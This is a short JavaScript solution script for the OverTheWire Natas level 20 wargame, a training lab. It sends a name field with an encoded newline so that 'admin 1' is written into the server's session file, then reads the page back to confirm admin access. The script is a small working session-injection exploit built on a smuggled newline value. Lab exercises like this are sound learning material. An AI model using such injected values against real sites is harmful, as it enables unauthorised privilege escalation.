url = 'http://natas20.natas.labs.overthewire.org/index.php?debug';
params = 'name=%0Aadmin%201';
truestring = "<br>You are an admin";

injected_query = "%0Dadmin%201"; //Note both %0A and %0D works here

//Writes to session file
xhr = new XMLHttpRequest();
xhr.open('POST',url,false);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.send(params);

//Reads from session file
xhr2 = new XMLHttpRequest();
xhr2.open('GET',url,false);
xhr2.onload = function () {
	if (xhr2.responseText.includes(truestring)) {
		console.log(xhr2.responseText);
	}
};
xhr2.send();
